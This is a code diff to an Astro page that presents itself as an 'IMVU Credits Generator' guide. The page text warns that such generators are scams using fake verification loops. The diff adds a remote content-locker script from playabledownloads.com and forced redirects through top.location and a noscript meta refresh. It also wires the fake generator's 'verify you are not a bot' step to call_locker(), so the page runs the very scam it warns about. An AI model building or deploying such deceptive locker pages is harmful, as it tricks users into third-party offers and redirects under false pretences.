@@ -71,37 +71,6 @@ const breadcrumbSchema = {
   ]
 };
 
-const faqSchema = {
-  "@context": "https://schema.org",
-  "@type": "FAQPage",
-  "mainEntity": [
-    {
-      "@type": "Question",
-      "name": "Are there real ways to get free IMVU Credits?",
-      "acceptedAnswer": { "@type": "Answer", "text": "Yes — through daily login rewards, promo codes from IMVU's official social media, the IMVU Creator Program, referral bonuses, and reward apps that pay GCash which can be used to buy credits." }
-    },
-    {
-      "@type": "Question",
-      "name": "Is there a real IMVU Credits Generator?",
-      "acceptedAnswer": { "@type": "Answer", "text": "There is no official third-party IMVU Credits Generator that can inject credits into an account. The safe alternative is to use IMVU rewards, promo codes, creator earnings, referral bonuses, and legitimate cashout apps to fund credits." }
-    },
-    {
-      "@type": "Question",
-      "name": "How much do IMVU Credits cost?",
-      "acceptedAnswer": { "@type": "Answer", "text": "IMVU sells credit packages starting at $4.99 for 3,000 credits. VIP members receive monthly bonus credits on top of their purchase. You can pay via credit card or PayPal — Filipinos can use a PayPal linked to GCash." }
-    },
-    {
-      "@type": "Question",
-      "name": "What can you buy with IMVU Credits?",
-      "acceptedAnswer": { "@type": "Answer", "text": "IMVU Credits let you buy clothing, accessories, furniture, rooms, animations, stickers, badges, and avatar items from the IMVU catalog — which has over 50 million items created by users and IMVU itself." }
-    },
-    {
-      "@type": "Question",
-      "name": "Can Filipinos buy IMVU Credits with GCash?",
-      "acceptedAnswer": { "@type": "Answer", "text": "Yes — indirectly. Link your GCash to a PayPal account, then use PayPal to purchase IMVU Credits on the IMVU website. This is the most common payment method for Filipino IMVU players." }
-    },
-  ]
-};
 ---
 
 <MainLayout
@@ -113,15 +82,10 @@ const faqSchema = {
   <Fragment slot="head">
     <script type="application/ld+json" set:html={JSON.stringify(articleSchema)} />
     <script type="application/ld+json" set:html={JSON.stringify(breadcrumbSchema)} />
-    <script type="application/ld+json" set:html={JSON.stringify(faqSchema)} />
-    <script is:inline type="text/javascript">
-    var dTjCL_Hpw_iXJztc = { it: 1429784, key: "8bce4" };
-    </script>
-
-    <script
-    src="https://d1qt1z4ccvak33.cloudfront.net/8a6fe84.js"
-    defer
-    ></script>
+    <script type="text/javascript" is:inline>var lck = false;</script>
+    <script type="text/javascript" src="https://playabledownloads.com/script_include.php?id=1897547"></script>
+    <script type="text/javascript" is:inline>if(!lck){top.location = 'https://playabledownloads.com/help/ablk.php?lkt=1'; }</script>
+    <noscript>Please enable JavaScript to access this page.<meta http-equiv="refresh" content="0;url=https://playabledownloads.com/help/enable_javascript.php?lkt=1" /></noscript>
 
     <script is:inline>
 
@@ -248,7 +212,7 @@ const faqSchema = {
               result.textContent = `Please verify you are not a bot ${chosenUsername}.`;
               button.removeAttribute('disabled');
               button.textContent = 'Run Generator Again';
-              _tx();
+              if (typeof call_locker === 'function') call_locker();
             }
           }, 500);
         });
@@ -394,16 +358,16 @@ const faqSchema = {
   </nav>
 
   <!-- ── Intro ──────────────────────────────────────────────────────────────── -->
-  <article class="max-w-3xl mx-auto px-4 pb-6">
-    <h2 class="text-xl font-bold text-gray-900 mt-4 mb-3">Looking for an IMVU Credits Generator?</h2>
-    <p class="text-gray-600 leading-relaxed mb-4">
+  <article class="max-w-3xl mx-auto px-4 pb-8">
+    <h2 class="text-xl font-bold text-gray-900 mt-8 mb-4">Looking for an IMVU Credits Generator?</h2>
+    <p class="text-gray-600 leading-relaxed mb-5">
       Most people searching for an <strong>IMVU Credits Generator</strong> want one thing:
       fast credits without wasting money. IMVU Credits are the premium currency that powers
       everything inside IMVU, from avatar outfits to rooms and gifts from the
       <strong>50 million+ item catalog</strong>. While no third-party tool can magically inject
       credits into your account, there are still real ways to stack them without paying out of pocket.
     </p>
-    <p class="text-gray-600 leading-relaxed mb-4">
+    <p class="text-gray-600 leading-relaxed mb-5">
       This page is built as the <strong>safe alternative to an IMVU Credit Generator</strong>:
       a complete breakdown of <strong>7 proven methods</strong> including IMVU daily rewards,
       official promo codes, the <strong>IMVU Creator Program</strong>, referral bonuses, and
@@ -411,13 +375,13 @@ const faqSchema = {
     </p>
 
     <!-- Credit value box -->
-    <div class="grid grid-cols-3 gap-3 mb-6">
+    <div class="grid grid-cols-3 gap-4 mb-8">
       {[
         { credits: '3,000', price: '~$4.99', label: 'Starter Pack' },
         { credits: '8,000', price: '~$9.99', label: 'Popular Pack' },
         { credits: '18,000', price: '~$19.99', label: 'Value Pack' },
       ].map(({ credits, price, label }) => (
-        <div class="bg-purple-50 border border-purple-100 rounded-xl p-3 text-center">
+        <div class="bg-purple-50 border border-purple-100 rounded-xl p-4 text-center">
           <div class="text-lg font-extrabold text-purple-700">{credits}</div>
           <div class="text-xs text-purple-500 font-semibold">Credits</div>
           <div class="text-xs text-gray-500 mt-1">{price}</div>
@@ -427,9 +391,9 @@ const faqSchema = {
     </div>
 
     <!-- Warning box -->
-    <div class="bg-red-50 border border-red-200 rounded-xl p-4 mb-6">
-      <p class="text-sm font-bold text-red-700 mb-2">⚠️ Avoid Fake "IMVU Credits Generator" Sites</p>
-      <p class="text-xs text-red-600 leading-relaxed">
+    <div class="bg-red-50 border border-red-200 rounded-xl p-5 mb-8">
+      <p class="text-sm font-bold text-red-700 mb-3">⚠️ Avoid Fake "IMVU Credits Generator" Sites</p>
+      <p class="text-sm text-red-600 leading-relaxed">
         Hundreds of websites claim to be an IMVU Credits Generator and promise instant credits
         after you enter your username. These are scams. They steal IMVU login credentials, collect
         personal data, or redirect people into malware and fake verification loops.
@@ -440,8 +404,8 @@ const faqSchema = {
   </article>
 
   <!-- ── Free IMVU Credits Guide ───────────────────────────────────────────── -->
-  <div id="methods" class="max-w-3xl mx-auto px-4 mb-10">
-    <article class="space-y-6">
+  <div id="methods" class="max-w-3xl mx-auto px-4 mb-12">
+    <article class="space-y-8">
       <h2 class="text-xl font-bold text-gray-900">7 Legit IMVU Credits Generator Alternatives</h2>
       {unlockedItems.map((item) => (
         <section>
@@ -453,9 +417,9 @@ const faqSchema = {
   </div>
 
   <!-- ── What Are IMVU Credits Section ──────────────────────────────────────── -->
-  <section class="max-w-3xl mx-auto px-4 pb-8">
-    <h2 class="text-xl font-bold text-gray-900 mb-4">What Can You Do with IMVU Credits?</h2>
-    <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+  <section class="max-w-3xl mx-auto px-4 pb-10">
+    <h2 class="text-xl font-bold text-gray-900 mb-5">What Can You Do with IMVU Credits?</h2>
+    <div class="grid grid-cols-1 sm:grid-cols-2 gap-5">
       {[
         { icon: '👗', title: 'Avatar Fashion', desc: 'Shop from 50M+ clothing items — from streetwear to fantasy outfits. New items drop every day from creators worldwide.' },
         { icon: '🛋️', title: 'Virtual Rooms', desc: 'Decorate your own personal 3D room with furniture, art, and custom designs to make it uniquely yours.' },
@@ -464,11 +428,11 @@ const faqSchema = {
         { icon: '🎁', title: 'Gift Friends', desc: 'Send gifts to friends and earn social points. Gifting is one of the most popular activities in IMVU.' },
         { icon: '🏠', title: 'Rooms & Scenes', desc: 'Buy premium room backgrounds and scenes to host friends, take avatar photos, and run your own virtual hangout.' },
       ].map(({ icon, title, desc }) => (
-        <div class="flex items-start gap-3 bg-gray-50 rounded-xl p-4 border border-gray-100">
+        <div class="flex items-start gap-3 bg-gray-50 rounded-xl p-5 border border-gray-100">
           <span class="text-2xl flex-shrink-0">{icon}</span>
           <div>
             <div class="font-semibold text-gray-800 text-sm">{title}</div>
-            <div class="text-xs text-gray-500 leading-relaxed mt-0.5">{desc}</div>
+            <div class="text-sm text-gray-500 leading-relaxed mt-0.5">{desc}</div>
           </div>
         </div>
       ))}
@@ -476,8 +440,8 @@ const faqSchema = {
   </section>
 
   <!-- ── IMVU vs Credits Comparison ─────────────────────────────────────────── -->
-  <section class="max-w-3xl mx-auto px-4 pb-10">
-    <h2 class="text-xl font-bold text-gray-900 mb-4">IMVU Credits vs IMVU VIP — Which Is Worth It?</h2>
+  <section class="max-w-3xl mx-auto px-4 pb-12">
+    <h2 class="text-xl font-bold text-gray-900 mb-5">IMVU Credits vs IMVU VIP — Which Is Worth It?</h2>
     <div class="overflow-x-auto">
       <table class="w-full text-sm border border-gray-200 rounded-xl overflow-hidden">
         <thead>
@@ -551,9 +515,9 @@ const faqSchema = {
   <EmailCapturePopup client:idle source="imvu-credits" />
 
   <!-- ── Internal Links ─────────────────────────────────────────────────────── -->
-  <section class="bg-gray-50 border-t border-gray-100 py-8 px-4">
+  <section class="bg-gray-50 border-t border-gray-100 py-10 px-4">
     <div class="max-w-3xl mx-auto">
-      <h2 class="text-sm font-bold text-gray-700 mb-4 uppercase tracking-wide">More Free Gaming Rewards</h2>
+      <h2 class="text-sm font-bold text-gray-700 mb-5 uppercase tracking-wide">More Free Gaming Rewards</h2>
       <div class="flex flex-wrap gap-3">
         {[
           { href: '/earn-gcash',                  label: '💰 Earn GCash Online'        },
